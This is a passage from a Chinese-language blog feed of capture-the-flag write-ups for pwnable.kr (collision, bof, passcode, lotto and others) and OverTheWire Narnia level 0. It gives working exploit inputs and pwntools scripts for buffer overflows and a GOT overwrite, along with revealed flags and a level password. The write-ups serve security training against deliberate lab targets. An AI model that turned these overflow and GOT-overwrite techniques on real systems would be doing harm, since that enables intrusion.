printf(&quot;passcode length should be 20 bytes\n&quot;);        return 0;    }    if(hashcode == check_password( argv[1] )){        system(&quot;/bin/cat flag&quot;);        return 0;    }    else        printf(&quot;wrong passcode.\n&quot;);    return 0;}</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p><p>col@pwnable:<del>$ ./col $(python -c “print ‘\x01’ *16+ ‘\xE8\x05\xD9\x1D’”)<br>daddy! I just managed to create a hash collision :)<br>col@pwnable:</del>$ </p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" srcset="/img/loading.gif" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" srcset="/img/loading.gif" alt=""><br><img src="/img/25.png" srcset="/img/loading.gif" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" srcset="/img/loading.gif" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p><pre><code>from pwn import *r = remote(&#39;pwnable.kr&#39;,&#39;9000&#39;)buf = 52 * &#39;A&#39;buf += p32(0xcafebabe)r.sendline(buf)r.interactive()</code></pre><blockquote><p>flag =daddy, I just pwned a buFFer :)</p></blockquote><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>这道题需要进行脱壳首先checksec flag<br>发现它是upx加壳的。<br>下载upx<br>upx -d flag<br>用IDA打开 alt -t 搜素flag找到flag即可。</p><blockquote><p>UPX…? sounds like a delivery service :)</p></blockquote><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p>ssh <a href="mailto:passcode@pwnable.kr">passcode@pwnable.kr</a> -p2222 (pw:guest)<br>这里是passcode.c的源码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){    int passcode1;    int passcode2;    printf(&quot;enter passcode1 : &quot;);    scanf(&quot;%d&quot;, passcode1);    fflush(stdin);    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)    printf(&quot;enter passcode2 : &quot;);        scanf(&quot;%d&quot;, passcode2);    printf(&quot;checking...\n&quot;);    if(passcode1==338150 &amp;&amp; passcode2==13371337){                printf(&quot;Login OK!\n&quot;);                system(&quot;/bin/cat flag&quot;);        }        else{                printf(&quot;Login Failed!\n&quot;);        exit(0);        }}void welcome(){    char name[100];    printf(&quot;enter you name : &quot;);    scanf(&quot;%100s&quot;, name);    printf(&quot;Welcome %s!\n&quot;, name);}int main(){    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);    welcome();    login();    // something after login...    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);    return 0;    }passcode@pwnable:~$  ./passcodeToddler&#39;s Secure Login System 1.0 beta.enter you name : 1Welcome 1!enter passcode1 : 338150Segmentation fault (core dumped)passcode@pwnable:~$  ./passcodeToddler&#39;s Secure Login System 1.0 beta.enter you name : 33Welcome 33!enter passcode1 : 33Segmentation fault (core dumped)passcode@pwnable:~$ cat passcode.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){    int passcode1;    int passcode2;    printf(&quot;enter passcode1 : &quot;);    scanf(&quot;%d&quot;, passcode1);    fflush(stdin);    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)    printf(&quot;enter passcode2 : &quot;);        scanf(&quot;%d&quot;, passcode2);    printf(&quot;checking...\n&quot;);    if(passcode1==338150 &amp;&amp; passcode2==13371337){                printf(&quot;Login OK!\n&quot;);                system(&quot;/bin/cat flag&quot;);        }        else{                printf(&quot;Login Failed!\n&quot;);        exit(0);        }}void welcome(){    char name[100];    printf(&quot;enter you name : &quot;);    scanf(&quot;%100s&quot;, name);    printf(&quot;Welcome %s!\n&quot;, name);}int main(){    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);    welcome();    login();    // something after login...    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);    return 0;    }</code></pre><p>其中输入passcode1和passcode2时没有加&amp;，所以程序发生了错误。</p><pre><code>     passcode@pwnable:~$ ls  flag  passcode    passcode.c  passcode@pwnable:~$ objdump -d passcode  passcode:     file format elf32-i386  Disassembly of section .init:  080483e0 &lt;_init&gt;:   80483e0:    53                       push   %ebx   80483e1:    83 ec 08                 sub    $0x8,%esp   80483e4:    e8 00 00 00 00           call   80483e9 &lt;_init+0x9&gt;   80483e9:    5b                       pop    %ebx   80483ea:    81 c3 0b 1c 00 00        add    $0x1c0b,%ebx   80483f0:    8b 83 fc ff ff ff        mov    -0x4(%ebx),%eax   80483f6:    85 c0                    test   %eax,%eax   80483f8:    74 05                    je     80483ff &lt;_init+0x1f&gt;   80483fa:    e8 71 00 00 00           call   8048470 &lt;__gmon_start__@plt&gt;   80483ff:    e8 3c 01 00 00           call   8048540 &lt;frame_dummy&gt;   8048404:    e8 17 03 00 00           call   8048720 &lt;__do_global_ctors_aux&gt;   8048409:    83 c4 08                 add    $0x8,%esp   804840c:    5b                       pop    %ebx   804840d:    c3                       ret      Disassembly of section .plt:  08048410 &lt;printf@plt-0x10&gt;:   8048410:    ff 35 f8 9f 04 08        pushl  0x8049ff8   8048416:    ff 25 fc 9f 04 08        jmp    *0x8049ffc   804841c:    00 00                    add    %al,(%eax)      ...  08048420 &lt;printf@plt&gt;:   8048420:    ff 25 00 a0 04 08        jmp    *0x804a000   8048426:    68 00 00 00 00           push   $0x0   804842b:    e9 e0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048430 &lt;fflush@plt&gt;:   8048430:    ff 25 04 a0 04 08        jmp    *0x804a004   8048436:    68 08 00 00 00           push   $0x8   804843b:    e9 d0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048440 &lt;__stack_chk_fail@plt&gt;:   8048440:    ff 25 08 a0 04 08        jmp    *0x804a008   8048446:    68 10 00 00 00           push   $0x10   804844b:    e9 c0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048450 &lt;puts@plt&gt;:   8048450:    ff 25 0c a0 04 08        jmp    *0x804a00c   8048456:    68 18 00 00 00           push   $0x18   804845b:    e9 b0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048460 &lt;system@plt&gt;:   8048460:    ff 25 10 a0 04 08        jmp    *0x804a010   8048466:    68 20 00 00 00           push   $0x20   804846b:    e9 a0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048470 &lt;__gmon_start__@plt&gt;:   8048470:    ff 25 14 a0 04 08        jmp    *0x804a014   8048476:    68 28 00 00 00           push   $0x28   804847b:    e9 90 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048480 &lt;exit@plt&gt;:   8048480:    ff 25 18 a0 04 08        jmp    *0x804a018   8048486:    68 30 00 00 00           push   $0x30   804848b:    e9 80 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  08048490 &lt;__libc_start_main@plt&gt;:   8048490:    ff 25 1c a0 04 08        jmp    *0x804a01c   8048496:    68 38 00 00 00           push   $0x38   804849b:    e9 70 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  080484a0 &lt;__isoc99_scanf@plt&gt;:   80484a0:    ff 25 20 a0 04 08        jmp    *0x804a020   80484a6:    68 40 00 00 00           push   $0x40   80484ab:    e9 60 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;  Disassembly of section .text:  080484b0 &lt;_start&gt;:   80484b0:    31 ed                    xor    %ebp,%ebp   80484b2:    5e                       pop    %esi   80484b3:    89 e1                    mov    %esp,%ecx   80484b5:    83 e4 f0                 and    $0xfffffff0,%esp   80484b8:    50                       push   %eax   80484b9:    54                       push   %esp   80484ba:    52                       push   %edx   80484bb:    68 10 87 04 08           push   $0x8048710   80484c0:    68 a0 86 04 08           push   $0x80486a0   80484c5:    51                       push   %ecx   80484c6:    56                       push   %esi   80484c7:    68 65 86 04 08           push   $0x8048665   80484cc:    e8 bf ff ff ff           call   8048490 &lt;__libc_start_main@plt&gt;   80484d1:    f4                       hlt       80484d2:    90                       nop   80484d3:    90                       nop   80484d4:    90                       nop   80484d5:    90                       nop   80484d6:    90                       nop   80484d7:    90                       nop   80484d8:    90                       nop   80484d9:    90                       nop   80484da:    90                       nop   80484db:    90                       nop   80484dc:    90                       nop   80484dd:    90                       nop   80484de:    90                       nop   80484df:    90                       nop  080484e0 &lt;__do_global_dtors_aux&gt;:   80484e0:    55                       push   %ebp   80484e1:    89 e5                    mov    %esp,%ebp   80484e3:    53                       push   %ebx   80484e4:    83 ec 04                 sub    $0x4,%esp   80484e7:    80 3d 30 a0 04 08 00     cmpb   $0x0,0x804a030   80484ee:    75 3f                    jne    804852f &lt;__do_global_dtors_aux+0x4f&gt;   80484f0:    a1 34 a0 04 08           mov    0x804a034,%eax   80484f5:    bb 20 9f 04 08           mov    $0x8049f20,%ebx   80484fa:    81 eb 1c 9f 04 08        sub    $0x8049f1c,%ebx   8048500:    c1 fb 02                 sar    $0x2,%ebx   8048503:    83 eb 01                 sub    $0x1,%ebx   8048506:    39 d8                    cmp    %ebx,%eax   8048508:    73 1e                    jae    8048528 &lt;__do_global_dtors_aux+0x48&gt;   804850a:    8d b6 00 00 00 00        lea    0x0(%esi),%esi   8048510:    83 c0 01                 add    $0x1,%eax   8048513:    a3 34 a0 04 08           mov    %eax,0x804a034   8048518:    ff 14 85 1c 9f 04 08     call   *0x8049f1c(,%eax,4)   804851f:    a1 34 a0 04 08           mov    0x804a034,%eax   8048524:    39 d8                    cmp    %ebx,%eax   8048526:    72 e8                    jb     8048510 &lt;__do_global_dtors_aux+0x30&gt;   8048528:    c6 05 30 a0 04 08 01     movb   $0x1,0x804a030   804852f:    83 c4 04                 add    $0x4,%esp   8048532:    5b                       pop    %ebx   8048533:    5d                       pop    %ebp   8048534:    c3                       ret       8048535:    8d 74 26 00              lea    0x0(%esi,%eiz,1),%esi   8048539:    8d bc 27 00 00 00 00     lea    0x0(%edi,%eiz,1),%edi  08048540 &lt;frame_dummy&gt;:   8048540:    55                       push   %ebp   8048541:    89 e5                    mov    %esp,%ebp   8048543:    83 ec 18                 sub    $0x18,%esp   8048546:    a1 24 9f 04 08           mov    0x8049f24,%eax   804854b:    85 c0                    test   %eax,%eax   804854d:    74 12                    je     8048561 &lt;frame_dummy+0x21&gt;   804854f:    b8 00 00 00 00           mov    $0x0,%eax   8048554:    85 c0                    test   %eax,%eax   8048556:    74 09                    je     8048561 &lt;frame_dummy+0x21&gt;   8048558:    c7 04 24 24 9f 04 08     movl   $0x8049f24,(%esp)   804855f:    ff d0                    call   *%eax   8048561:    c9                       leave     8048562:    c3                       ret       8048563:    90                       nop  08048564 &lt;login&gt;:   8048564:    55                       push   %ebp   8048565:    89 e5                    mov    %esp,%ebp   8048567:    83 ec 28                 sub    $0x28,%esp   804856a:    b8 70 87 04 08           mov    $0x8048770,%eax   804856f:    89 04 24                 mov    %eax,(%esp)   8048572:    e8 a9 fe ff ff           call   8048420 &lt;printf@plt&gt;   8048577:    b8 83 87 04 08           mov    $0x8048783,%eax   804857c:    8b 55 f0                 mov    -0x10(%ebp),%edx   804857f:    89 54 24 04              mov    %edx,0x4(%esp)   8048583:    89 04 24                 mov    %eax,(%esp)   8048586:    e8 15 ff ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;   804858b:    a1 2c a0 04 08           mov    0x804a02c,%eax   8048590:    89 04 24                 mov    %eax,(%esp)   8048593:    e8 98 fe ff ff           call   8048430 &lt;fflush@plt&gt;   8048598:    b8 86 87 04 08           mov    $0x8048786,%eax   804859d:    89 04 24                 mov    %eax,(%esp)   80485a0:    e8 7b fe ff ff           call   8048420 &lt;printf@plt&gt;   80485a5:    b8 83 87 04 08           mov    $0x8048783,%eax   80485aa:    8b 55 f4                 mov    -0xc(%ebp),%edx   80485ad:    89 54 24 04              mov    %edx,0x4(%esp)   80485b1:    89 04 24                 mov    %eax,(%esp)   80485b4:    e8 e7 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;   80485b9:    c7 04 24 99 87 04 08     movl   $0x8048799,(%esp)   80485c0:    e8 8b fe ff ff           call   8048450 &lt;puts@plt&gt;   80485c5:    81 7d f0 e6 28 05 00     cmpl   $0x528e6,-0x10(%ebp)   80485cc:    75 23                    jne    80485f1 &lt;login+0x8d&gt;   80485ce:    81 7d f4 c9 07 cc 00     cmpl   $0xcc07c9,-0xc(%ebp)   80485d5:    75 1a                    jne    80485f1 &lt;login+0x8d&gt;   80485d7:    c7 04 24 a5 87 04 08     movl   $0x80487a5,(%esp)   80485de:    e8 6d fe ff ff           call   8048450 &lt;puts@plt&gt;   80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)   80485ea:    e8 71 fe ff ff           call   8048460 &lt;system@plt&gt;   80485ef:    c9                       leave     80485f0:    c3                       ret       80485f1:    c7 04 24 bd 87 04 08     movl   $0x80487bd,(%esp)   80485f8:    e8 53 fe ff ff           call   8048450 &lt;puts@plt&gt;   80485fd:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)   8048604:    e8 77 fe ff ff           call   8048480 &lt;exit@plt&gt;  08048609 &lt;welcome&gt;:   8048609:    55                       push   %ebp   804860a:    89 e5                    mov    %esp,%ebp   804860c:    81 ec 88 00 00 00        sub    $0x88,%esp   8048612:    65 a1 14 00 00 00        mov    %gs:0x14,%eax   8048618:    89 45 f4                 mov    %eax,-0xc(%ebp)   804861b:    31 c0                    xor    %eax,%eax   804861d:    b8 cb 87 04 08           mov    $0x80487cb,%eax   8048622:    89 04 24                 mov    %eax,(%esp)   8048625:    e8 f6 fd ff ff           call   8048420 &lt;printf@plt&gt;   804862a:    b8 dd 87 04 08           mov    $0x80487dd,%eax   804862f:    8d 55 90                 lea    -0x70(%ebp),%edx   8048632:    89 54 24 04              mov    %edx,0x4(%esp)   8048636:    89 04 24                 mov    %eax,(%esp)   8048639:    e8 62 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;   804863e:    b8 e3 87 04 08           mov    $0x80487e3,%eax   8048643:    8d 55 90                 lea    -0x70(%ebp),%edx   8048646:    89 54 24 04              mov    %edx,0x4(%esp)   804864a:    89 04 24                 mov    %eax,(%esp)   804864d:    e8 ce fd ff ff           call   8048420 &lt;printf@plt&gt;   8048652:    8b 45 f4                 mov    -0xc(%ebp),%eax   8048655:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax   804865c:    74 05                    je     8048663 &lt;welcome+0x5a&gt;   804865e:    e8 dd fd ff ff           call   8048440 &lt;__stack_chk_fail@plt&gt;   8048663:    c9                       leave     8048664:    c3                       ret      08048665 &lt;main&gt;:   8048665:    55                       push   %ebp   8048666:    89 e5                    mov    %esp,%ebp   8048668:    83 e4 f0                 and    $0xfffffff0,%esp   804866b:    83 ec 10                 sub    $0x10,%esp   804866e:    c7 04 24 f0 87 04 08     movl   $0x80487f0,(%esp)   8048675:    e8 d6 fd ff ff           call   8048450 &lt;puts@plt&gt;   804867a:    e8 8a ff ff ff           call   8048609 &lt;welcome&gt;   804867f:    e8 e0 fe ff ff           call   8048564 &lt;login&gt;   8048684:    c7 04 24 18 88 04 08     movl   $0x8048818,(%esp)   804868b:    e8 c0 fd ff ff           call   8048450 &lt;puts@plt&gt;   8048690:    b8 00 00 00 00           mov    $0x0,%eax   8048695:    c9                       leave     8048696:    c3                       ret       8048697:    90                       nop   8048698:    90                       nop   8048699:    90                       nop   804869a:    90                       nop   804869b:    90                       nop   804869c:    90                       nop   804869d:    90                       nop   804869e:    90                       nop   804869f:    90                       nop  080486a0 &lt;__libc_csu_init&gt;:   80486a0:    55                       push   %ebp   80486a1:    57                       push   %edi   80486a2:    56                       push   %esi   80486a3:    53                       push   %ebx   80486a4:    e8 69 00 00 00           call   8048712 &lt;__i686.get_pc_thunk.bx&gt;   80486a9:    81 c3 4b 19 00 00        add    $0x194b,%ebx   80486af:    83 ec 1c                 sub    $0x1c,%esp   80486b2:    8b 6c 24 30              mov    0x30(%esp),%ebp   80486b6:    8d bb 20 ff ff ff        lea    -0xe0(%ebx),%edi   80486bc:    e8 1f fd ff ff           call   80483e0 &lt;_init&gt;   80486c1:    8d 83 20 ff ff ff        lea    -0xe0(%ebx),%eax   80486c7:    29 c7                    sub    %eax,%edi   80486c9:    c1 ff 02                 sar    $0x2,%edi   80486cc:    85 ff                    test   %edi,%edi   80486ce:    74 29                    je     80486f9 &lt;__libc_csu_init+0x59&gt;   80486d0:    31 f6                    xor    %esi,%esi   80486d2:    8d b6 00 00 00 00        lea    0x0(%esi),%esi   80486d8:    8b 44 24 38              mov    0x38(%esp),%eax   80486dc:    89 2c 24                 mov    %ebp,(%esp)   80486df:    89 44 24 08              mov    %eax,0x8(%esp)   80486e3:    8b 44 24 34              mov    0x34(%esp),%eax   80486e7:    89 44 24 04              mov    %eax,0x4(%esp)   80486eb:    ff 94 b3 20 ff ff ff     call   *-0xe0(%ebx,%esi,4)   80486f2:    83 c6 01                 add    $0x1,%esi   80486f5:    39 fe                    cmp    %edi,%esi   80486f7:    75 df                    jne    80486d8 &lt;__libc_csu_init+0x38&gt;   80486f9:    83 c4 1c                 add    $0x1c,%esp   80486fc:    5b                       pop    %ebx   80486fd:    5e                       pop    %esi   80486fe:    5f                       pop    %edi   80486ff:    5d                       pop    %ebp   8048700:    c3                       ret       8048701:    eb 0d                    jmp    8048710 &lt;__libc_csu_fini&gt;   8048703:    90                       nop   8048704:    90                       nop   8048705:    90                       nop   8048706:    90                       nop   8048707:    90                       nop   8048708:    90                       nop   8048709:    90                       nop   804870a:    90                       nop   804870b:    90                       nop   804870c:    90                       nop   804870d:    90                       nop   804870e:    90                       nop   804870f:    90                       nop  08048710 &lt;__libc_csu_fini&gt;:   8048710:    f3 c3                    repz ret   08048712 &lt;__i686.get_pc_thunk.bx&gt;:   8048712:    8b 1c 24                 mov    (%esp),%ebx   8048715:    c3                       ret       8048716:    90                       nop   8048717:    90                       nop   8048718:    90                       nop   8048719:    90                       nop   804871a:    90                       nop   804871b:    90                       nop   804871c:    90                       nop   804871d:    90                       nop   804871e:    90                       nop   804871f:    90                       nop  08048720 &lt;__do_global_ctors_aux&gt;:   8048720:    55                       push   %ebp   8048721:    89 e5                    mov    %esp,%ebp   8048723:    53                       push   %ebx   8048724:    83 ec 04                 sub    $0x4,%esp   8048727:    a1 14 9f 04 08           mov    0x8049f14,%eax   804872c:    83 f8 ff                 cmp    $0xffffffff,%eax   804872f:    74 13                    je     8048744 &lt;__do_global_ctors_aux+0x24&gt;   8048731:    bb 14 9f 04 08           mov    $0x8049f14,%ebx   8048736:    66 90                    xchg   %ax,%ax   8048738:    83 eb 04                 sub    $0x4,%ebx   804873b:    ff d0                    call   *%eax   804873d:    8b 03                    mov    (%ebx),%eax   804873f:    83 f8 ff                 cmp    $0xffffffff,%eax   8048742:    75 f4                    jne    8048738 &lt;__do_global_ctors_aux+0x18&gt;   8048744:    83 c4 04                 add    $0x4,%esp   8048747:    5b                       pop    %ebx   8048748:    5d                       pop    %ebp   8048749:    c3                       ret       804874a:    90                       nop   804874b:    90                       nop  Disassembly of section .fini:  0804874c &lt;_fini&gt;:   804874c:    53                       push   %ebx   804874d:    83 ec 08                 sub    $0x8,%esp   8048750:    e8 00 00 00 00           call   8048755 &lt;_fini+0x9&gt;   8048755:    5b                       pop    %ebx   8048756:    81 c3 9f 18 00 00        add    $0x189f,%ebx   804875c:    e8 7f fd ff ff           call   80484e0 &lt;__do_global_dtors_aux&gt;   8048761:    83 c4 08                 add    $0x8,%esp   8048764:    5b                       pop    %ebx   8048765:    c3                       ret      passcode@pwnable:~$ </code></pre><p>可以看到welcome函数中数组设得比较大，设想可以通过name数组对passcode1进行覆盖运行system命令。</p><p>两个函数： welcome（） 和  login（） 是具有相同的EBP.<br>welcome（）中的name在ebp-0x70的位置<br>login（） 中的passcode1在%ebp-0x10<br>从name覆写道passcode1的长度为：len = 0x70-0x10 = 112-16 = 96<br>所以构造： ‘A’ *96个占位 + prinf_got_addr +system_flag</p><pre><code>printf_got = 0x0804a000 system_flag = 0x080485E3python -c &quot;print (‘a‘*96+‘\x00\xa0\x04\x08‘+‘\n‘+‘134514147\n‘)&quot; |./passcode</code></pre><p>此时调用 scanf(“%d”, passcode1); 函数，会向这个地址处printf_got_addr处写数据，也<br>就是要修改printf_got的地址，修改成什么呢？当然是我们需要执行的函数<br>（system_flag），使 system(“/bin/cat flag”) 得到执行。</p><p>那么我们又如何得到printf_got和system的地址呢<br>找prinf_got_addr ：通过 objdump -d passcode中的printf@plt指向的地址：printf_got = 0x0804a000</p><pre><code>08048420 &lt;printf@plt&gt;:8048420: ff 25 00 a0 04 08 jmp *0x0804a0008048426: 68 00 00 00 00 push $0x0804842b: e9 e0 ff ff ff jmp 8048410 &lt;_init+0x30&gt;</code></pre><p>找system(“/bin/cat flag”)汇编程序中程序执行到的位置。或者通过objdump -d passcode中的login指向的地址：system_flag = 0x080485E3 。</p><p>因为scanf要输入的是%d,0x080485e3的十进制就是134514147。</p><pre><code>80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp)</code></pre><p>而下面是我用pwntools写的脚本：</p><pre><code>from pwn import *s = ssh(host=&#39;pwnable.kr&#39;,user=&#39;passcode&#39;,port=2222,password=&#39;guest&#39;)p = s.process(&#39;./passcode&#39;)shellcode = &#39;A&#39;*96 + p32(0x0804a000)p.recvuntil(&quot;enter you name : &quot;)p.sendline(shellcode)p.recvuntil(&#39;enter passcode1 : &#39;)p.sendline(str(int(0x80485E3)))p.interactive()</code></pre><blockquote><blockquote><blockquote><p>Sorry mom.. I got confused about scanf usage :(</p></blockquote></blockquote></blockquote><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>randon()这个函数是伪随机的只要用gdb运行一次查看一下random的值一直试验就出来flag了。<br>flag:</p><blockquote><p>Mommy, I thought libc random is unpredictable…</p></blockquote><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p>…..</p><h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><p>xor(value,nums)<br>与1异或nums次。</p><h1 id="BLACKJACK"><a href="#BLACKJACK" class="headerlink" title="BLACKJACK"></a>BLACKJACK</h1><p>把金额输成负数就可以了。</p><p> #include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;fcntl.h&gt;</p><p>unsigned char submit[6];</p><p>void play(){</p><pre><code>int i;printf(&quot;Submit your 6 lotto bytes : &quot;);fflush(stdout);int r;r = read(0, submit, 6);printf(&quot;Lotto Start!\n&quot;);//sleep(1);// generate lotto numbersint fd = open(&quot;/dev/urandom&quot;, O_RDONLY);if(fd==-1){    printf(&quot;error. tell admin\n&quot;);    exit(-1);}unsigned char lotto[6];if(read(fd, lotto, 6) != 6){    printf(&quot;error2. tell admin\n&quot;);    exit(-1);}for(i=0; i&lt;6; i++){    lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45}close(fd);// calculate lotto scoreint match = 0, j = 0;for(i=0; i&lt;6; i++){    for(j=0; j&lt;6; j++){        if(lotto[i] == submit[j]){            match++;        }    }}// win!if(match == 6){    system(&quot;/bin/cat flag&quot;);}else{    printf(&quot;bad luck...\n&quot;);}</code></pre><p>}</p><p>void help(){<br>    printf(“- nLotto Rule -\n”);<br>    printf(“nlotto is consisted with 6 random natural numbers less than 46\n”);<br>    printf(“your goal is to match lotto numbers as many as you can\n”);<br>    printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);<br>    printf(“for more details, follow the link below\n”);<br>    printf(“<a href="http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;" target="_blank" rel="noopener">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</a>);<br>    printf(“mathematical chance to win this game is known to be 1/8145060.\n”);<br>}</p><p>int main(int argc, char* argv[]){</p><pre><code>// menuunsigned int menu;while(1){    printf(&quot;- Select Menu -\n&quot;);    printf(&quot;1. Play Lotto\n&quot;);    printf(&quot;2. Help\n&quot;);    printf(&quot;3. Exit\n&quot;);    scanf(&quot;%d&quot;, &amp;menu);    switch(menu){        case 1:            play();            break;        case 2:            help();            break;        case 3:            printf(&quot;bye\n&quot;);            return 0;        default:            printf(&quot;invalid menu\n&quot;);            break;    }}return 0;</code></pre><p>}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>overthewire narnia解题(一)</title>
    <link href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/"/>
    <url>/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>账号：narnia0 密码：narnia0<br>SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，因此我们可以看到它narnia0可以作为narnia1用户执行。从输出中我们可以看到是x86 ELF二进制文件。似乎很清楚，那就是它的源代码，我们需要利用sls -lnarnia1file narnia0narnia0narnia0.cnarnia0narnia0以某种方式编写程序，这样我们就可以运行任意命令narnia1。运行cat narnia0.c给出以下输出。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    long val=0x41414141;    char buf[20];    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);    printf(&quot;Here is your chance: &quot;);    scanf(&quot;%24s&quot;,&amp;buf);    printf(&quot;buf: %s\n&quot;,buf);    printf(&quot;val: 0x%08x\n&quot;,val);    if(val==0xdeadbeef)        system(&quot;/bin/sh&quot;);    else {        printf(&quot;WAY OFF!!!!\n&quot;);        exit(1);    }    return 0;}</code></pre><p>从代码中可以明显看出，关卡的目的是为给出打开shell val的值。我们可以看到该程序最多读取24个字节并将其放在变量中，该变量恰好是20个字节长。由于是在之后定义的，因此，用于存储值的4个字节的内存将在为20个字节保留后直接写入。因此，如果我们提供所有24个字节，它们将溢出到存储的值的存储器中。因此，我们可以控制其价值。0xdeadbeefnarnia1stdinbufbufvalvalbufval</p><p>现在，为了写入有效负载，我们需要确定所用机器的字节顺序。以下程序将使我们能够做到这一点。</p><pre><code>const int i = 1;#define is_bigendian() ( (*(char*)&amp;i) == 0)#include &lt;stdio.h&gt;int main(void) {    printf(&quot;%d\n&quot;, is_bigendian());}</code></pre><p>该is_bigendian函数将指向值1的整数指针转换为字符指针，将其取消引用并将结果与​​值0进行比较。如果系统为big-endian，则字符指针将指向最高有效位变量的字节，i为零。我们可以在的子目录中编写和编译该程序/tmp。</p><pre><code>narnia1@melinda:~$ mkdir /tmp/lukeaddisonnarnia1@melinda:~$ cd /tmp/lukeaddisonnarnia1@melinda:/tmp/lukeaddison$ nano endian.cnarnia1@melinda:/tmp/lukeaddison$ gcc endian.c -o endiannarnia1@melinda:/tmp/lukeaddison$ ./endian 0</code></pre><p>因此，我们使用的是Little-endian机器，我们的有效负载将包含字节字符串\xef\xbe\xad\xde（的反向\xde\xad\xbe\xef）。该\x符号开始一个十六进制转义序列，使我们能够编写包含任意字节的字符串常量。我们使用python回显我们的有效负载并将其通过管道传递给narnia0。</p><pre><code>narnia0@melinda:/narnia$ python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0 Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?val: 0xdeadbeefnarnia0@melinda:/narnia$</code></pre><p>发生了什么？程序的输出显示该var值等于正确的值，那么为什么我们的外壳没有打开？发生的事情是外壳确实打开了，但随后立即关闭了。这是因为python命令终止时，外壳EOF程序从管道接收到了（文件末尾），并且也终止了。为了解决这个问题，我们可以使用cat来连接python进程的输出stdin。</p><pre><code>narnia0@melinda:/narnia$ cat &lt;(python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;) - | ./narnia0</code></pre><p>运行上面的命令可以使我们的Shell进程保持打开状态，并且我们键入的任何内容都会通过该cat进程发送给它。因此，我们可以将命令键入为narnia1。</p><pre><code>whoaminarnia1cat /etc/narnia_pass/narnia1efeidiedae</code></pre><h1 id="level-0-level-1"><a href="#level-0-level-1" class="headerlink" title="level 0-level 1"></a>level 0-level 1</h1><p>账号：narnial1 密码： efeideae<br>Linux export 命令用于设置或显示环境变量。<br>只要到网上找到一个可用的shellcode传入EGG变量就行了。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>overthewire解题（二）</title>
    <link href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
